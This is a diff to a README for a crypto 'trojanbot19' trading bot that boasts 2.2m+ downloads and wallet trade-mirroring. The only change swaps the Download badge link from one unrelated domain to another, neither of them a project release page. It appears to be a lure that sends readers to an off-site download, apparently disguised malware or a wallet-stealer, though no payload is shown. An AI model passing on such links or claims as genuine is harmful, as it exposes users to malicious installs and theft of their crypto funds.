@@ -49,7 +49,7 @@ A: Yes — automatically mirrors any wallet's trades.
 
 **Monthly downloads:** 2.2m+
 
-[![Download](https://img.shields.io/badge/Download-v5.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/trojanbot19)
+[![Download](https://img.shields.io/badge/Download-v5.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/trojanbot19)
 
 ---
 
